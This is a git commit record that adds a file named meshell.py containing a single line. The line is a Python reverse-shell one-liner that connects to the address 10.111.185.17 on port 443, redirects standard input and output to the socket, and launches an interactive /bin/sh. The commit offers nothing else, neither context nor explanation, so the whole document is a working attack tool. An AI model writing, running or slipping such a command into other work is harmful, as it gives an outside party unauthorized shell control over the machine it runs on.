d2095c9a0a7aa83ed8b82823135b894f62b38877
Cody Sixteen <610code@gmail.com>
2019-04-01 15:38:12 +0200

    Add files via upload

---
+++ meshell.py
@@ -0,0 +1,1 @@
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.111.185.17",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
